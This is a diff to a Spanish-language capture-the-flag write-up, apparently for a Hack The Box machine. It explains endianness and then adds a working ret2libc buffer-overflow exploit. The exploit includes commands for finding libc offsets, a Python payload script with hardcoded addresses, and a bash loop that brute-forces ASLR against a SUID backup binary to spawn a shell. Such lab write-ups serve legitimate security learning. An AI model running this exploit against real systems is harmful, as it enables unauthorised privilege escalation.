@@ -624,7 +624,7 @@ gef➤  r adsf a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 
 
 ```
 
-### Littel Endial(alrrevez de como escribes) vs Big Endial (normal)
+### Littel Endian(alrrevez de como escribes) vs Big Endian(normal)
 
 #### Byte menos significativo (LSB):
 Supongamos que tenemos un byte de 8 bits con los siguientes valores binarios:
@@ -639,6 +639,10 @@ Ahora, supongamos que tenemos otro byte de 8 bits con los siguientes valores bin
 MSB (Byte más significativo) = 10010110
 
 El bit en la extrema izquierda (1) es el bit más significativo porque tiene el mayor peso en la representación del número. Este bit es el que contribuye más al valor total del byte.
+
+
+### Little endian
+
 
 En sistemas Linux de 32 bits (x86), las direcciones de memoria se representan en el formato "little-endian". Esto significa que los bytes menos significativos se almacenan en las direcciones de memoria más bajas, mientras que los bytes más significativos se almacenan en las direcciones de memoria más altas.
 
@@ -655,11 +659,81 @@ Siguiente byte: 0x34
 Byte más alto (más significativo) en la dirección más alta: 0x12
 
 
+### Exploit
+
+Para sacar los offsets:
+
+```
+which backup | xargs ldd
+readelf -s /lib32/libc.so.6 # el s es para ver los simbolos de ahi vamos a sacar los offsets o desplazamientos en ese archivo que se le sumaran a lo cargado en memoria.
+readelf -s /lib32/libc.so.6 | grep " system"
+
+
+```
+
+![image](https://github.com/gecr07/Node-HTB/assets/63270579/87bfc99d-4533-4453-8d00-277e465755a5)
+
+
+Para sacar el offset de /bin/sh
+
+```
+strings -a -t x /lib32/libc.so.6
+
+-a ver todos los strings no nada mas de la seccion data que es el comportamiento por default
+-t x codificar en modod hex
+```
+![image](https://github.com/gecr07/Node-HTB/assets/63270579/15c94fed-32ad-4911-82f0-5d7b2993dfca)
+
+
+```python
+
+
+from struct import pack # para no tener que darle las direcciones alrrevez tu metelas normla esto lo hace automatico.
+
+offset = 512
+junk = "A"*offset
+
+
+#ret2libc -> EIP -> system_addr + exit_addr + bin_sh_addr # system("/bin/sh") [Libc]
+
+# Cuando hay ASL activado no puedes obtener las direcciones con el GDB porque van a cambiar
+# Vamos a aplicar fuerza bruta
+
+libc_base_addr = 0xf75af000
+
+system_addr_off = 0x0003a940
+exit_addr_off =  0x0002e7b0
+bin_sh_addr_off =0x0015900b
+
+system_addr = pack("<I", libc_base_addr+ system_addr_off)
+exit_addr =   pack("<I", libc_base_addr+ exit_addr_off)
+bin_sh_addr = pack("<I", libc_base_addr+ bin_sh_addr_off)
+
+payload = junk + system_addr + exit_addr + bin_sh_addr
+
+print(payload)
+
+
+#tom@node:/tmp$ readelf -s /lib32/libc.so.6 | grep -E " system@@| exit@@"
+#  141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+# 1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+
+#tom@node:/tmp$ strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
+#15900b /bin/sh
 
 
 
 
+```
 
+Entonces para ejecutar seria
+
+
+```
+while true;do backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 $(python exploit.py); done
+```
+
+![image](https://github.com/gecr07/Node-HTB/assets/63270579/e1f3695a-d1fd-47fa-ba89-cef9fde9ebaa)
 
 
 
